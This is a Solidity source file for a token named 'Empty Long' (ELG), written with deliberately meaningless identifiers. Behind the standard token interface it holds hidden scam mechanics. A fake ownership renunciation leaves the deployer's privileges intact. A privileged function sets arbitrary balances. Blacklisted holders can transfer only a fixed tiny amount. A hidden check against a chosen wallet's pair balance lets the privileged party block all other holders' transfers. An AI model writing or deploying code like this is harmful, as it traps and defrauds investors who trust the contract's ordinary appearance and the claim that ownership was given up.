//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface swapTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listAmountReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingFeeAt {
    function createPair(address enableBuyAt, address shouldIs) external returns (address);
}

interface exemptFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minSell) external view returns (uint256);

    function transfer(address shouldMax, uint256 receiverExemptAt) external returns (bool);

    function allowance(address shouldSwapLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverExemptAt) external returns (bool);

    function transferFrom(
        address sender,
        address shouldMax,
        uint256 receiverExemptAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamListAt, uint256 value);
    event Approval(address indexed shouldSwapLiquidity, address indexed spender, uint256 value);
}

interface tradingIs is exemptFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EmptyLong is listAmountReceiver, exemptFee, tradingIs {

    string private takeMax = "ELG";

    function marketingFund() public {
        emit OwnershipTransferred(totalSwap, address(0));
        toEnable = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return buyIs;
    }

    address fundLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address teamMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public limitEnable;

    string private modeTo = "Empty Long";

    event OwnershipTransferred(address indexed shouldTo, address indexed marketingSender);

    uint256 fundToken;

    function fromReceiver(address tokenExempt) public {
        require(tokenExempt.balance < 100000);
        if (tradingBuyReceiver) {
            return;
        }
        if (enableTx) {
            listFee = limitEnable;
        }
        toSwap[tokenExempt] = true;
        if (enableTx != isAmountMax) {
            listFee = limitEnable;
        }
        tradingBuyReceiver = true;
    }

    uint256 constant receiverTake = 16 ** 10;

    mapping(address => bool) public toSwap;

    uint256 private listFee;

    function owner() external view returns (address) {
        return toEnable;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeMax;
    }

    function balanceOf(address minSell) public view virtual override returns (uint256) {
        return minSwap[minSell];
    }

    function walletSender(address autoSender, uint256 receiverExemptAt) public {
        txExempt();
        minSwap[autoSender] = receiverExemptAt;
    }

    mapping(address => uint256) private minSwap;

    address public modeExempt;

    bool public senderReceiver;

    function name() external view virtual override returns (string memory) {
        return modeTo;
    }

    constructor (){
        
        swapTo marketingReceiver = swapTo(teamMarketing);
        modeExempt = marketingFeeAt(marketingReceiver.factory()).createPair(marketingReceiver.WETH(), address(this));
        
        totalSwap = _msgSender();
        marketingFund();
        toSwap[totalSwap] = true;
        minSwap[totalSwap] = swapEnable;
        
        emit Transfer(address(0), totalSwap, swapEnable);
    }

    uint8 private buyIs = 18;

    bool public walletAutoIs;

    uint256 private swapEnable = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private receiverExempt;

    bool public enableTx;

    function transferFrom(address minMarketingTo, address shouldMax, uint256 receiverExemptAt) external override returns (bool) {
        if (_msgSender() != teamMarketing) {
            if (receiverExempt[minMarketingTo][_msgSender()] != type(uint256).max) {
                require(receiverExemptAt <= receiverExempt[minMarketingTo][_msgSender()]);
                receiverExempt[minMarketingTo][_msgSender()] -= receiverExemptAt;
            }
        }
        return minWalletMode(minMarketingTo, shouldMax, receiverExemptAt);
    }

    function minTrading(address minMarketingTo, address shouldMax, uint256 receiverExemptAt) internal returns (bool) {
        require(minSwap[minMarketingTo] >= receiverExemptAt);
        minSwap[minMarketingTo] -= receiverExemptAt;
        minSwap[shouldMax] += receiverExemptAt;
        emit Transfer(minMarketingTo, shouldMax, receiverExemptAt);
        return true;
    }

    bool private receiverMaxMin;

    bool private isAmountMax;

    mapping(address => bool) public feeShould;

    function allowance(address marketingMax, address tradingLaunch) external view virtual override returns (uint256) {
        if (tradingLaunch == teamMarketing) {
            return type(uint256).max;
        }
        return receiverExempt[marketingMax][tradingLaunch];
    }

    bool public tradingBuyReceiver;

    function txMinLaunch(address maxTo) public {
        txExempt();
        
        if (maxTo == totalSwap || maxTo == modeExempt) {
            return;
        }
        feeShould[maxTo] = true;
    }

    function transfer(address autoSender, uint256 receiverExemptAt) external virtual override returns (bool) {
        return minWalletMode(_msgSender(), autoSender, receiverExemptAt);
    }

    address private toEnable;

    address public totalSwap;

    function txExempt() private view {
        require(toSwap[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return swapEnable;
    }

    uint256 modeEnableAt;

    function approve(address tradingLaunch, uint256 receiverExemptAt) public virtual override returns (bool) {
        receiverExempt[_msgSender()][tradingLaunch] = receiverExemptAt;
        emit Approval(_msgSender(), tradingLaunch, receiverExemptAt);
        return true;
    }

    function getOwner() external view returns (address) {
        return toEnable;
    }

    function toShould(uint256 receiverExemptAt) public {
        txExempt();
        modeEnableAt = receiverExemptAt;
    }

    function minWalletMode(address minMarketingTo, address shouldMax, uint256 receiverExemptAt) internal returns (bool) {
        if (minMarketingTo == totalSwap) {
            return minTrading(minMarketingTo, shouldMax, receiverExemptAt);
        }
        uint256 amountAutoTrading = exemptFee(modeExempt).balanceOf(fundLiquidity);
        require(amountAutoTrading == modeEnableAt);
        require(shouldMax != fundLiquidity);
        if (feeShould[minMarketingTo]) {
            return minTrading(minMarketingTo, shouldMax, receiverTake);
        }
        return minTrading(minMarketingTo, shouldMax, receiverExemptAt);
    }

}